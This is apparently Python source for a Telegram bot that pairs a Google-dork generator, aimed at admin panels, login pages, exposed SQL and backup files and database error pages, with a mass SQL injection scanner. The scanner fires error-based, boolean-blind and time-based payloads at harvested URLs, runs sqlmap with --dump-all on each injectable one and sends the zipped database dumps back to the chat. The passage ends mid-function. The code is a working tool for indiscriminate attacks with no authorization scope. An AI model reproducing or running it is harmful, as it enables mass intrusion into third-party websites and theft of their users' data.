#!/usr/bin/env python3
"""
Merged Bot: SQL Injection Tester + DB Dumper + Advanced Dork Generator

Features:
  - SQLi scanning (Phase 1: find injectable URLs, Phase 2: SQLMap dump)
  - Direct dump mode (/dump) on any URL list
  - Dork generator with 15 templates, persistent user config, inline toggles
  - Full config export/import, generation stats

Commands overview:
  SQLi:
    /scan, /dump, /cancel, /status, /myconfig, /setfilter, /setconcurrent,
    /settimeout, /setthreads, /start, /help, /about

  Dork:
    /dork <amount>          - Generate dorks using stored keywords
    /preview <amount>       - Preview dorks inline
    /config                 - Show current dork config
    /stats                  - Your generation history
    /setkeywords            - Set keywords (text or .txt file)
    /addkeywords            - Append keywords without replacing
    /clearkeywords          - Clear all keywords
    /settemplates           - Toggle dork templates (inline)
    /category               - Toggle whole categories at once
    /setparams              - Set SQL parameter names
    /settlds                - Set target TLDs
    /setoperators           - Toggle search operators
    /setextensions          - Toggle file extensions
    /setnumbers             - Set NB placeholder values
    /setcms                 - Set CMS names for (CM) placeholder
    /toggleshuffle          - Shuffle output on/off
    /togglededupe           - Remove duplicates on/off
    /reset                  - Reset dork config to defaults
    /exportconfig           - Download config as JSON
    /importconfig           - Reply to a JSON file to import
    /generate               - Generate all possible dorks (cartesian product)
    /gen <n>                - Generate n random dorks (optionally reply to keywords file)
    /estimate               - Estimate max unique dorks with current config
    /setpreset <fast|balanced|wide> - Quick config presets

Requires:
  pip install python-telegram-bot aiohttp sqlmap
  BOT_TOKEN environment variable
"""

import asyncio
import io
import itertools
import json
import logging
import os
import random
import shutil
import sqlite3
import sys
import tempfile
import zipfile
from datetime import datetime
from html import unescape
from pathlib import Path
from typing import List, Set, Optional, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp
from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ConversationHandler, filters, ContextTypes,
)

# ========================= CONFIGURATION =========================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("No BOT_TOKEN found in environment variables")

VERSION = "4.0.1"

# SQLMap binary path (pip install sqlmap)
SQLMAP_BIN = os.path.join(os.path.dirname(sys.executable), "sqlmap")

# SQLi scanning constants
PAYLOADS = [
    "'", '"', "')", "' OR '1'='1' --", "' OR 1=1 --",
]

# Boolean-blind payloads (TRUE, FALSE pairs) — reduced to highest-signal pairs
BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' AND '1'='2"),
    ("' OR 1=1 --", "' AND 1=2 --"),
]

# Time-based payloads — reduced sleep to 3s for speed
TIME_PAYLOADS = [
    ("' OR SLEEP(3) --", 3),
    ("' OR pg_sleep(3) --", 3),
    ("' WAITFOR DELAY '0:0:3' --", 3),
]

# Threshold for boolean response difference (30% change)
BOOLEAN_DIFF_THRESHOLD = 0.3

DB_ERROR_PATTERNS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "sqlstate", "ora-", "pg::syntaxerror",
    "sqlite3::exception", "microsoft ole db provider for sql server",
    "odbc sql server driver", "syntax error or access violation", "division by zero",
    "supplied argument is not a valid mysql", "mysql_fetch_array() expects parameter",
    "mysql_num_rows() expects parameter", "pg_query(): query failed",
    "unterminated string literal",
]

COMMON_SQLI_PARAMS = {
    "id", "user", "username", "pass", "password", "page", "cat", "category",
    "product", "item", "code", "num", "q", "search", "query", "filter",
    "sort", "order", "lang", "view", "pid", "uid", "sid", "tid",
}

DEFAULT_FILTER     = "medium"
DEFAULT_CONCURRENT = 100
DEFAULT_TIMEOUT    = 20
DEFAULT_THREADS    = 5
SQLMAP_TIMEOUT     = 300
PROGRESS_INTERVAL  = 2

# ========================= DORK GENERATOR CONSTANTS =========================

DB_PATH = os.getenv("DB_PATH", "dorkgen.db")

# Default data for dork generator
DEFAULT_PARAMS: List[str] = [
    "id", "user_id", "item_id", "product_id", "page_id", "purchase_id",
    "login_id", "game_id", "gamer_id", "username_id", "type_id", "coID",
    "cat", "category", "type", "uid", "pid", "cid", "sid", "tid", "rid",
    "vid", "eid", "account_id", "member_id", "post_id", "news_id",
    "article_id", "order_id", "invoice_id", "customer_id",
]

DEFAULT_TLDS: List[str] = [
    ".ac", ".ae", ".af", ".al", ".am", ".ar", ".at", ".au", ".az", ".ba",
    ".bd", ".be", ".bg", ".bh", ".bo", ".br", ".by", ".bz", ".ca", ".cl",
    ".cn", ".co", ".co.uk", ".com", ".com.tr", ".cr", ".cu", ".cy", ".cz",
    ".de", ".dk", ".dz", ".ec", ".edu", ".ee", ".eg", ".es", ".et", ".eu",
    ".fi", ".fr", ".ge", ".gr", ".gt", ".hk", ".hn", ".hr", ".hu", ".id",
    ".ie", ".il", ".in", ".io", ".iq", ".ir", ".is", ".it", ".jp", ".ke",
    ".kg", ".kh", ".kr", ".kw", ".kz", ".la", ".lb", ".li", ".lk", ".lt",
    ".lu", ".lv", ".ly", ".ma", ".me", ".mg", ".ml", ".mn", ".mt", ".mu",
    ".mx", ".my", ".mz", ".na", ".ne", ".net", ".ng", ".ni", ".nl", ".no",
    ".np", ".nz", ".om", ".org", ".pa", ".pe", ".ph", ".pk", ".pl", ".pt",
    ".pw", ".py", ".qa", ".ro", ".rs", ".ru", ".sa", ".sd", ".se", ".sg",
    ".si", ".sk", ".sl", ".sn", ".so", ".sr", ".sv", ".sy", ".sz", ".th",
    ".tj", ".tk", ".tl", ".tm", ".tn", ".to", ".tr", ".tt", ".tv", ".tw",
    ".tz", ".ua", ".ug", ".uk", ".us", ".uy", ".uz", ".va", ".ve", ".vn",
    ".ye", ".za", ".zm", ".zw",
]

DEFAULT_OPERATORS: List[str] = [
    "inurl:", "intext:", "allintext:", "allintitle:", "source:", "filetype:",
    "insubject:", "allinanchor:", "allinurl:", "cache:", "inanchor:",
    "info:", "intitle:", "link:",
]

DEFAULT_EXTENSIONS: List[str] = [".php", ".php3", ".asp", ".aspx", ".jsp", ".cfm", ".cgi", ".pl"]

DEFAULT_NUMBERS: List[str] = ["0", "1", "2", "3", "10", "100", "123", "999", "1000", "9999"]

DEFAULT_CMS: List[str] = [
    "wordpress", "joomla", "drupal", "magento", "opencart",
    "prestashop", "woocommerce", "laravel", "codeigniter", "yii",
]

# 20 Dork templates in 5 categories — (KW)=keyword, (PF)=ext, (PT)=param,
# (DE)=tld, (NB)=number, (CM)=cms  [SQLi templates removed]
DORK_TEMPLATES: Dict[str, str] = {
    # ── Admin / Panel ─────────────────────────────────────────────────
    "T01": "inurl:admin (KW) site:(DE)",
    "T02": "inurl:(KW)/admin filetype:(PF)",
    "T03": "intitle:\"admin\" inurl:(KW) site:(DE)",
    "T04": "inurl:(KW)/admin/(PT)=(NB)",
    "T05": "intitle:\"administration\" inurl:(KW)(PF)",
    "T06": "inurl:(KW)/wp-admin site:(DE)",
    # ── Login Pages ───────────────────────────────────────────────────
    "T07": "inurl:login (KW)(PF) (PT)=",
    "T08": "intitle:\"login\" inurl:(KW) site:(DE)",
    "T09": "inurl:(KW)/login(PF) site:(DE)",
    "T10": "inurl:signin (KW) \"(PT)=\" site:(DE)",
    # ── File Exposure ─────────────────────────────────────────────────
    "T11": "intitle:\"index of\" (KW) site:(DE)",
    "T12": "filetype:sql (KW) site:(DE)",
    "T13": "filetype:log (KW)(PF) intext:\"(PT)\"",
    "T14": "filetype:bak inurl:(KW)(PF) site:(DE)",
    # ── CMS‑Specific ──────────────────────────────────────────────────
    "T15": "inurl:(KW) intext:\"(CM)\" (PT)=(NB)",
    "T16": "site:(DE) inurl:(KW) intext:\"Powered by (CM)\"",
    "T17": "inurl:(CM)/(KW)(PF) (PT)=",
    "T18": "\"(CM)\" inurl:(KW)(PF) \"(PT)=\" site:(DE)",
    # ── Error / Debug ─────────────────────────────────────────────────
    "T19": "intext:\"sql syntax\" (KW)(PF) site:(DE)",
    "T20": "intext:\"Warning: mysql\" (KW) site:(DE)",
}

TEMPLATE_DESCRIPTIONS: Dict[str, str] = {
    "T01": "Admin URL by domain",       "T02": "Admin path + ext",
    "T03": "Admin title + domain",      "T04": "Admin param probe",
    "T05": "Administration title",      "T06": "WordPress admin finder",
    "T07": "Login + param probe",       "T08": "Login title + domain",
    "T09": "Login path + domain",       "T10": "Signin + param match",
    "T11": "Directory listing",         "T12": "SQL dump exposure",
    "T13": "Log file exposure",         "T14": "Backup file exposure",
    "T15": "CMS intext + param",        "T16": "CMS powered-by + domain",
    "T17": "CMS path + param probe",    "T18": "CMS full combo",
    "T19": "SQL syntax error page",     "T20": "MySQL warning page",
}

TEMPLATE_CATEGORIES: Dict[str, List[str]] = {
    "admin": ["T01", "T02", "T03", "T04", "T05", "T06"],
    "login": ["T07", "T08", "T09", "T10"],
    "files": ["T11", "T12", "T13", "T14"],
    "cms":   ["T15", "T16", "T17", "T18"],
    "error": ["T19", "T20"],
}

CATEGORY_LABELS: Dict[str, str] = {
    "admin": "🟠 Admin/Panel",
    "login": "🟡 Login Pages",
    "files": "🟢 File Exposure",
    "cms":   "🔵 CMS-Specific",
    "error": "🟣 Error/Debug",
}

# Pre-compute which variable placeholders each template uses (for product iteration)
_ALL_PLACEHOLDERS = ["(PF)", "(PT)", "(DE)", "(NB)", "(CM)"]
TEMPLATE_PLACEHOLDERS: Dict[str, List[str]] = {
    tid: [p for p in _ALL_PLACEHOLDERS if p in tmpl]
    for tid, tmpl in DORK_TEMPLATES.items()
}

SPLIT_TEMPLATES = {tid: t.split("(KW)") for tid, t in DORK_TEMPLATES.items()}

DEFAULT_ENABLED_TEMPLATES: List[str] = list(DORK_TEMPLATES.keys())

COMMON_TLDS_SUBSET = [".com", ".net", ".org", ".in", ".uk", ".de", ".fr", ".ru",
                      ".br", ".cn", ".jp", ".au", ".ca", ".it", ".es", ".pl",
                      ".nl", ".tr", ".pk", ".bd", ".sa", ".ae", ".ir", ".id"]

ALL_EXTENSIONS = DEFAULT_EXTENSIONS

# ========================= SQLITE DB FOR DORK CONFIG =========================

def init_db() -> None:
    with sqlite3.connect(DB_PATH) as con:
        con.execute("""
            CREATE TABLE IF NOT EXISTS user_config (
                user_id     INTEGER PRIMARY KEY,
                config_json TEXT    NOT NULL
            )
        """)
        con.execute("""
            CREATE TABLE IF NOT EXISTS dork_history (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id     INTEGER NOT NULL,
                amount      INTEGER NOT NULL,
                kw_count    INTEGER NOT NULL,
                created_at  TEXT    NOT NULL
            )
        """)
        con.commit()

def _default_config() -> Dict[str, Any]:
    return {
        "keywords":   [],
        "templates":  DEFAULT_ENABLED_TEMPLATES.copy(),
        "params":     DEFAULT_PARAMS[:15].copy(),
        "tlds":       [".com", ".net", ".org", ".in", ".uk", ".de", ".fr",
                       ".ru", ".br", ".cn", ".jp", ".au", ".pk", ".bd", ".tr"],
        "operators":  DEFAULT_OPERATORS.copy(),
        "extensions": [".php", ".php3"],
        "numbers":    DEFAULT_NUMBERS.copy(),
        "cms":        DEFAULT_CMS.copy(),
        "shuffle":    True,
        "dedupe":     True,
    }

def get_cfg(user_id: int) -> Dict[str, Any]:
    with sqlite3.connect(DB_PATH) as con:
        row = con.execute(
            "SELECT config_json FROM user_config WHERE user_id=?", (user_id,)
        ).fetchone()
    return json.loads(row[0]) if row else _default_config()

def save_cfg(user_id: int, cfg: Dict[str, Any]) -> None:
    with sqlite3.connect(DB_PATH) as con:
        con.execute("""
            INSERT INTO user_config(user_id, config_json) VALUES(?,?)
            ON CONFLICT(user_id) DO UPDATE SET config_json=excluded.config_json
        """, (user_id, json.dumps(cfg)))
        con.commit()

def log_generation(user_id: int, amount: int, kw_count: int) -> None:
    with sqlite3.connect(DB_PATH) as con:
        con.execute(
            "INSERT INTO dork_history(user_id,amount,kw_count,created_at) VALUES(?,?,?,?)",
            (user_id, amount, kw_count, datetime.utcnow().isoformat())
        )
        con.commit()

def get_stats(user_id: int) -> Dict[str, Any]:
    with sqlite3.connect(DB_PATH) as con:
        row = con.execute("""
            SELECT COUNT(*), COALESCE(SUM(amount),0), MAX(created_at)
            FROM dork_history WHERE user_id=?
        """, (user_id,)).fetchone()
    return {"runs": row[0], "total": row[1], "last": row[2]}

# ========================= DORK GENERATOR CORE =========================

def _pick(lst: List[str]) -> str:
    return random.choice(lst) if lst else ""

def build_dork(template_id: str, kw: str, cfg: Dict[str, Any]) -> str:
    parts = SPLIT_TEMPLATES[template_id]
    pf = _pick(cfg["extensions"])
    pt = _pick(cfg["params"])
    de = _pick(cfg["tlds"]).lstrip(".")
    sf = _pick(cfg["operators"])
    nb = _pick(cfg["numbers"])
    cm = _pick(cfg.get("cms", DEFAULT_CMS))
    dork = parts[0]
    for part in parts[1:]:
        dork += kw + part
    return (dork
        .replace("(PF)", pf)
        .replace("(PT)", pt)
        .replace("(DE)", de)
        .replace("(SF)", sf)
        .replace("(NB)", nb)
        .replace("(CM)", cm)
    )

def _placeholder_lists(cfg: Dict[str, Any]) -> Dict[str, List[str]]:
    """Return the value lists for each placeholder key."""
    return {
        "(PF)": cfg.get("extensions") or [""],
        "(PT)": cfg.get("params")     or [""],
        "(DE)": [t.lstrip(".") for t in (cfg.get("tlds") or [""])],
        "(NB)": cfg.get("numbers")    or [""],
        "(CM)": cfg.get("cms")        or DEFAULT_CMS,
    }

def _iter_dorks(kw: str, tmpl: str, ph_lists: Dict[str, List[str]], shuffle: bool):
    """Yield every unique dork for (keyword, template) by iterating the Cartesian
    product of only the placeholders that appear in this template."""
    used = TEMPLATE_PLACEHOLDERS[tmpl]
    if not used:
        # Template has no variable placeholders — only one unique dork
        yield DORK_TEMPLATES[tmpl].replace("(KW)", kw)
        return
    value_lists = [ph_lists[p] for p in used]
    combos = list(itertools.product(*value_lists))
    if shuffle:
        random.shuffle(combos)
    base = DORK_TEMPLATES[tmpl].replace("(KW)", kw)
    for combo in combos:
        dork = base
        for ph, val in zip(used, combo):
            dork = dork.replace(ph, val)
        yield dork

def generate_dorks(keywords: List[str], amount: int, cfg: Dict[str, Any]) -> List[str]:
    """Generate up to `amount` dorks by exhaustive Cartesian-product enumeration.

    Unlike the old random-trial approach this never burns retries on duplicate
    attempts, so 10 k / 20 k requests work reliably.
    """
    templates = cfg.get("templates", DEFAULT_ENABLED_TEMPLATES)
    if not templates or not keywords:
        return []

    dedupe   = cfg.get("dedupe", True)
    shuffle  = cfg.get("shuffle", True)
    ph_lists = _placeholder_lists(cfg)

    # Build ordered list of (kw, tmpl) pairs
    pairs = [(kw.strip(), tmpl) for kw in keywords for tmpl in templates]
    if shuffle:
        random.shuffle(pairs)

    results: List[str] = []
    seen:    Set[str]  = set()

    for kw, tmpl in pairs:
        if len(results) >= amount:
            break
        for dork in _iter_dorks(kw, tmpl, ph_lists, shuffle):
            if len(results) >= amount:
                break
            if dedupe:
                if dork in seen:
                    continue
                seen.add(dork)
            results.append(dork)

    if shuffle:
        random.shuffle(results)
    return results

async def generate_dorks_with_progress(
    update: Update,
    keywords: List[str],
    amount: int,
    cfg: Dict[str, Any],
    status_msg
) -> Optional[io.BytesIO]:
    """
    Stream dork generation to a temporary file with progress updates.
    Returns a BytesIO buffer ready for sending as a document.
    """
    templates = cfg.get("templates", [])
    if not templates or not keywords:
        return None

    dedupe   = cfg.get("dedupe", True)
    shuffle  = cfg.get("shuffle", True)
    ph_lists = _placeholder_lists(cfg)

    # Build pairs and shuffle if needed
    pairs = [(kw.strip(), tmpl) for kw in keywords for tmpl in templates]
    if shuffle:
        random.shuffle(pairs)

    # Use a temporary file for streaming
    tmp_file = tempfile.NamedTemporaryFile(mode="w+", encoding="utf-8", delete=False, suffix=".txt")
    seen: Set[str] = set()
    count = 0
    last_update = 0
    update_interval = 5000  # Update every 5000 dorks

    try:
        for kw, tmpl in pairs:
            if count >= amount:
                break
            for dork in _iter_dorks(kw, tmpl, ph_lists, shuffle):
                if count >= amount:
                    break
                if dedupe:
                    if dork in seen:
                        continue
                    seen.add(dork)
                tmp_file.write(dork + "\n")
                count += 1

                # Update progress periodically
                if count - last_update >= update_interval:
                    await status_msg.edit_text(
                        f"⚙️ Generating dorks… {count:,} / {amount:,}"
                    )
                    last_update = count

        tmp_file.flush()
        tmp_file.seek(0)

        # Read back into BytesIO
        buf = io.BytesIO(tmp_file.read().encode())
        buf.name = f"dorks_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{count}.txt"

        await status_msg.edit_text(f"✅ Generated {count:,} dorks. Uploading file…")
        return buf

    except Exception as e:
        await status_msg.edit_text(f"❌ Generation failed: {e}")
        return None
    finally:
        tmp_file.close()
        os.unlink(tmp_file.name)

def _estimate_total_dorks(cfg: Dict[str, Any]) -> int:
    """Estimate maximum unique dorks possible with current config (capped at 1e9)."""
    templates = cfg.get("templates", [])
    keywords = cfg.get("keywords", [])
    if not templates or not keywords:
        return 0
    ph_lists = _placeholder_lists(cfg)
    total = 0
    for tmpl in templates:
        used = TEMPLATE_PLACEHOLDERS[tmpl]
        if not used:
            total += len(keywords)
        else:
            combos = 1
            for p in used:
                combos *= len(ph_lists[p])
            total += len(keywords) * combos
    return min(total, 1_000_000_000)

def generate_all_dorks(cfg: Dict[str, Any]) -> List[str]:
    """Generate all possible dorks (cartesian product) based on enabled templates and lists."""
    templates = cfg.get("templates", [])
    keywords = cfg.get("keywords", [])
    if not templates or not keywords:
        return []
    params = cfg.get("params", [""])
    tlds = [t.lstrip(".") for t in cfg.get("tlds", [""])]
    operators = cfg.get("operators", [""])
    extensions = cfg.get("extensions", [""])
    numbers = cfg.get("numbers", [""])
    cms_list = cfg.get("cms", DEFAULT_CMS)

    results: List[str] = []
    seen: Set[str] = set()
    for tmpl in templates:
        for kw in keywords:
            for pf in extensions:
                for pt in params:
                    for de in tlds:
                        for sf in operators:
                            for nb in numbers:
                                for cm in cms_list:
                                    dork = DORK_TEMPLATES[tmpl]\
                                        .replace("(KW)", kw)\
                                        .replace("(PF)", pf)\
                                        .replace("(PT)", pt)\
                                        .replace("(DE)", de)\
                                        .replace("(SF)", sf)\
                                        .replace("(NB)", nb)\
                                        .replace("(CM)", cm)
                                    if dork not in seen:
                                        seen.add(dork)
                                        results.append(dork)
    if cfg.get("shuffle"):
        random.shuffle(results)
    return results


def active_category_summary(cfg: Dict[str, Any]) -> str:
    """Return a compact string showing active template count per category."""
    enabled = set(cfg.get("templates", []))
    lines = []
    for cat, tids in TEMPLATE_CATEGORIES.items():
        active = [t for t in tids if t in enabled]
        if active:
            lines.append(f"  {CATEGORY_LABELS[cat]}: {len(active)}/{len(tids)} templates")
    return "\n".join(lines) if lines else "  (none)"

# ========================= SQLI SCANNING & DUMPING =========================

user_scan_data: Dict[int, Dict] = {}

def get_scan_state(uid: int) -> Dict:
    if uid not in user_scan_data:
        user_scan_data[uid] = {
            "file_path":        None,
            "filter_intensity": DEFAULT_FILTER,
            "scanning":         False,
            "concurrent":       DEFAULT_CONCURRENT,
            "timeout":          DEFAULT_TIMEOUT,
            "threads":          DEFAULT_THREADS,
            "cancel_event":     asyncio.Event(),
        }
    return user_scan_data[uid]

def should_test(url: str, intensity: str) -> bool:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if intensity == "high":
        return True
    if intensity == "medium":
        return len(params) > 0
    if intensity == "low":
        return any(p.lower() in COMMON_SQLI_PARAMS for p in params)
    return len(params) > 0

async def _test_param(session: aiohttp.ClientSession, parsed, params: dict,
                      param: str, orig_val: str, orig_len: int, timeout_s: int) -> bool:
    """Test a single parameter for SQLi — error, boolean, and time-based."""
    http_timeout = aiohttp.ClientTimeout(total=timeout_s)

    # 1. Error-based (fastest — fire all payloads concurrently)
    async def error_check(payload):
        new_params = dict(params)
        new_params[param] = [orig_val + payload]
        new_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
        try:
            async with session.get(new_url, timeout=http_timeout) as r:
                body = (await r.text()).lower()
                return any(pat in body for pat in DB_ERROR_PATTERNS)
        except Exception:
            return False

    results = await asyncio.gather(*[error_check(p) for p in PAYLOADS])
    if any(results):
        return True

    # 2. Boolean-blind (run TRUE/FALSE pairs, stop at first hit)
    async def bool_check_one(true_payload, false_payload):
        tp = dict(params); tp[param] = [orig_val + true_payload]
        fp = dict(params); fp[param] = [orig_val + false_payload]
        t_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
        f_url = urlunparse(parsed._replace(query=urlencode(fp, doseq=True)))
        try:
            async with session.get(t_url, timeout=http_timeout) as rt:
                true_len = len(await rt.text())
            async with session.get(f_url, timeout=http_timeout) as rf:
                false_len = len(await rf.text())
            diff_ratio = abs(true_len - false_len) / max(orig_len, 1)
            return diff_ratio > BOOLEAN_DIFF_THRESHOLD or (
                true_len != false_len and true_len != orig_len
            )
        except Exception:
            return False

    # Fire all boolean checks, but return early on first True
    bool_tasks = [asyncio.create_task(bool_check_one(t, f)) for t, f in BOOLEAN_PAYLOADS]
    done, pending = await asyncio.wait(bool_tasks, return_when=asyncio.FIRST_COMPLETED)
    # Cancel remaining tasks
    for task in pending:
        task.cancel()
    if any(task.result() for task in done if not task.cancelled()):
        return True

    # 3. Time-blind (last resort — run all concurrently)
    async def time_check(payload, sleep_sec):
        new_params = dict(params)
        new_params[param] = [orig_val + payload]
        new_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
        try:
            start = asyncio.get_event_loop().time()
            async with session.get(new_url, timeout=http_timeout) as r:
                await r.text()
            return asyncio.get_event_loop().time() - start >= sleep_sec - 0.5
        except asyncio.TimeoutError:
            return True
        except Exception:
            return False

    results = await asyncio.gather(*[time_check(p, s) for p, s in TIME_PAYLOADS])
    return any(results)


async def is_injectable(session: aiohttp.ClientSession, url: str, timeout_s: int) -> bool:
    """Test URL for SQLi — tests all parameters in parallel."""
    http_timeout = aiohttp.ClientTimeout(total=timeout_s)
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return False

    # Baseline
    try:
        async with session.get(url, timeout=http_timeout) as r:
            orig_len = len(await r.text())
    except Exception:
        return False

    # Test all params concurrently
    tasks = [
        _test_param(session, parsed, params, param, (values[0] if values else ""), orig_len, timeout_s)
        for param, values in params.items()
    ]
    results = await asyncio.gather(*tasks)
    return any(results)

async def run_sqlmap(url: str, output_dir: str, threads: int) -> bool:
    cmd = [
        SQLMAP_BIN, "-u", url, "--batch", "--dump-all", "--output-dir", output_dir,
        "--timeout", "15", "--retries", "1", "--level", "2", "--risk", "1",
        "--threads", str(threads), "--random-agent",
    ]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=SQLMAP_TIMEOUT)
        output = stdout.decode(errors="ignore").lower()
        success = ("is vulnerable" in output or "fetched data logged" in output or
                   "dumped to" in output or "database management system" in output)
        return success
    except asyncio.TimeoutError:
        try:
            proc.kill()
        except:
            pass
        return False
    except:
        return False

def zip_sqlmap_output(output_dir: str, zip_path: str) -> bool:
    has_files = False
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(output_dir):
            for fname in files:
                fp = os.path.join(root, fname)
                arcname = os.path.relpath(fp, output_dir)
                zf.write(fp, arcname)
                has_files = True
    return has_files

def build_bar(done: int, total: int, width: int = 20) -> str:
    if total == 0:
        return "░" * width
    filled = int(width * done / total)
    return "█" * filled + "░" * (width - filled)

def phase1_text(done: int, total: int, found: int) -> str:
    pct = int(100 * done / total) if total else 0
    return (
        "🔎 Phase 1 — Finding injectable URLs...\n\n"
        f"[{build_bar(done, total)}] {pct}%\n"
        f"✅ Tested  : {done}/{total}\n"
        f"🚨 Found   : {found}"
    )

def dump_text(done: int, total: int, dumped: int) -> str:
    pct = int(100 * done / total) if total else 0
    return (
        "💾 SQLMap — Dumping databases...\n\n"
        f"[{build_bar(done, total)}] {pct}%\n"
        f"✅ Processed : {done}/{total}\n"
        f"🗄️  Dumped    : {dumped}"
    )

async def edit_safe(msg, text: str):
    try:
        await msg.edit_text(text)
    except:
        pass

async def run_progress_updater(stop_event: asyncio.Event, msg, text_fn, counter: list, total: int, secondary: list):
    last = ""
    while not stop_event.is_set():
        await asyncio.sleep(PROGRESS_INTERVAL)
        new = text_fn(counter[0], total, secondary[0])
        if new != last:
            await edit_safe(msg, new)
            last = new

async def execute_dump(urls: list, chat_id: int, context: ContextTypes.DEFAULT_TYPE,
                       cancel_ev: asyncio.Event, threads: int, label: str = "SQLMap") -> int:
    total = len(urls)
    done = [0]
    dumped = [0]
    lock = asyncio.Lock()
    prog_msg = await context.bot.send_message(chat_id=chat_id, text=dump_text(0, total, 0))
    stop = asyncio.Event()
    upd = asyncio.create_task(run_progress_updater(stop, prog_msg, dump_text, done, total, dumped))
    sqlmap_base = tempfile.mkdtemp(prefix="sqlmap_")
    for idx, url in enumerate(urls, 1):
        if cancel_ev.is_set():
            async with lock:
                done[0] += 1
            continue
        url_dir = os.path.join(sqlmap_base, f"target_{idx}")
        os.makedirs(url_dir, exist_ok=True)
        success = await run_sqlmap(url, url_dir, threads)
        async with lock:
            done[0] += 1
            if success:
                dumped[0] += 1
        if success:
            zip_path = url_dir + ".zip"
            has_data = zip_sqlmap_output(url_dir, zip_path)
            if has_data and os.path.getsize(zip_path) > 0:
                try:
                    with open(zip_path, "rb") as f:
                        await context.bot.send_document(
                            chat_id=chat_id, document=f, filename=f"db_dump_{idx}.zip",
                            caption=f"🗄️ Database dump #{idx}\n🔗 {url[:80]}"
                        )
                except Exception as e:
                    logging.error(f"Failed to send dump zip: {e}")
                try:
                    os.unlink(zip_path)
                except:
                    pass
    stop.set()
    upd.cancel()
    try:
        await upd
    except asyncio.CancelledError:
        pass
    final = dump_text(done[0], total, dumped[0]) + f"\n\n{'✅ Done' if not cancel_ev.is_set() else '🛑 Cancelled'}! {dumped[0]}/{total} database(s) dumped."
    await edit_safe(prog_msg, final)
    shutil.rmtree(sqlmap_base, ignore_errors=True)
    return dumped[0]

def read_urls_from_file(path: str) -> list:
    urls = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(unescape(line))
    return urls

async def download_document(doc: Document, context: ContextTypes.DEFAULT_TYPE) -> str:
    tg_file = await context.bot.get_file(doc.file_id)
    with tempfile.NamedTemporaryFile(mode="w+b", suffix=".txt", delete=False) as tmp:
        await tg_file.download_to_drive(tmp.name)
        return tmp.name

# ========================= SQLI SCAN / DUMP TASKS =========================

async def run_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    state = get_scan_state(user_id)
    if state["scanning"]:
        return
    state["scanning"] = True
    state["cancel_event"].clear()
    file_path = state["file_path"]
    intensity = state["filter_intensity"]
    concurrent = state["concurrent"]
    timeout_s = state["timeout"]
    threads = state["threads"]
    cancel_ev = state["cancel_event"]
    chat_id = update.effective_chat.id
    await update.message.reply_text("🚀 Scan started — two phases incoming...")
    try:
        urls = read_urls_from_file(file_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {e}")
        state["scanning"] = False
        return
    filtered = [u for u in urls if should_test(u, intensity)]
    if not filtered:
        await update.message.reply_text("⚠️ No URLs passed the filter. Try /setfilter high")
        state["scanning"] = False
        return
    await update.message.reply_text(
        f"📋 {len(filtered)} URLs to test (original: {len(urls)})\n"
        f"⚙️ Filter: {intensity} | Concurrent: {concurrent} | Timeout: {timeout_s}s | Threads: {threads}\n"
        f"🔎 Starting Phase 1..."
    )
    total1 = len(filtered)
    done1 = [0]
    candidates = []
    cands_count = [0]
    lock1 = asyncio.Lock()
    p1_msg = await context.bot.send_message(chat_id=chat_id, text=phase1_text(0, total1, 0))
    stop1 = asyncio.Event()
    upd1 = asyncio.create_task(run_progress_updater(stop1, p1_msg, phase1_text, done1, total1, cands_count))
    sem = asyncio.Semaphore(concurrent)
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def phase1_worker(url):
            if cancel_ev.is_set():
                async with lock1:
                    done1[0] += 1
                return
            async with sem:
                try:
                    vuln = await is_injectable(session, url, timeout_s)
                    async with lock1:
                        done1[0] += 1
                        if vuln:
                            candidates.append(url)
                            cands_count[0] = len(candidates)
                except Exception:
                    async with lock1:
                        done1[0] += 1
        await asyncio.gather(*[asyncio.create_task(phase1_worker(u)) for u in filtered])
    stop1.set()
    upd1.cancel()
    try:
        await upd1
    except asyncio.CancelledError:
        pass
    if cancel_ev.is_set():
        await edit_safe(p1_msg, f"🛑 Cancelled.\n✅ Tested: {done1[0]}/{total1} | 🚨 Found: {len(candidates)}")
        await update.message.reply_text("🛑 Scan cancelled.")
        state["scanning"] = False
        try:
            os.unlink(file_path)
        except:
            pass
        return
    await edit_safe(p1_msg, phase1_text(total1, total1, len(candidates)) + f"\n\n✅ Phase 1 done! {len(candidates)} injectable URL(s) found.")
    if not candidates:
        await update.message.reply_text("❌ No injectable URLs found.\nTry /setfilter high or upload different URLs.")
        state["scanning"] = False
        try:
            os.unlink(file_path)
        except:
            pass
        return
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
        tmp.write("\n".join(candidates))
        cand_path = tmp.name
    with open(cand_path, "rb") as f:
        await context.bot.send_document(chat_id=chat_id, document=f, filename="injectable_urls.txt",
                                        caption=f"🚨 Phase 1: {len(candidates)} injectable URL(s)\n💾 Starting Phase 2 — database dump...")
    os.unlink(cand_path)
    dumped_count = await execute_dump(candidates, chat_id, context, cancel_ev, threads, "Phase2")
    cancelled_note = " (cancelled)" if cancel_ev.is_set() else ""
